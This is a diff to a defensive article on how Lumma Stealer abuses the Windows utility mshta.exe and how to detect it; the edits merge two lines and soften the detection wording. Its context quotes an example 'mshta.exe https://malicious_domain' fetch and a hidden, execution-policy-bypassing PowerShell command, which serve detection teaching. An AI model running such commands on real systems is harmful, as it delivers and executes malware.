@@ -13,8 +13,7 @@ One example is Lumma Stealer, a type of information stealer often associated wit
 
 **What is mshta.exe?** 
 
-Mshta.exe is a native Windows utility designed to execute Microsoft HTML Applications (HTA). HTAs are essentially HTML files combined with scripting languages such as VBScript or JavaScript, and they execute with the same privileges as the user.
-Threat actors like Lumma Stealers commonly exploit mshta.exe by passing malicious arguments that spawn PowerShell commands. For example, Lumma Stealer might use a command like:
+Mshta.exe is a native Windows utility designed to execute Microsoft HTML Applications (HTA). HTAs are essentially HTML files combined with scripting languages such as VBScript or JavaScript, and they execute with the same privileges as the user. Threat actors like Lumma Stealers commonly exploit mshta.exe by passing malicious arguments that spawn PowerShell commands. For example, Lumma Stealer might use a command like:
 
 ```bash
 mshta.exe https://malicious_domain
@@ -27,7 +26,7 @@ powershell.exe -w -h -ep Unrestricted -nop function [a bunch of hex]
 
 **Detection**
 
-A strong detection signal is when mshta.exe spawns a child process such as PowerShell or cmd.exe, especially when the PowerShell command line is unusually long or obfuscated. These are high-fidelity indicators of potentially malicious behavior.
+Another potential detection opportunity would be to check when mshta.exe spawns a child process such as PowerShell or cmd.exe, especially when the PowerShell command line is unusually long or obfuscated. These are indicators of potentially malicious behavior.
 
 **Remediation**
 
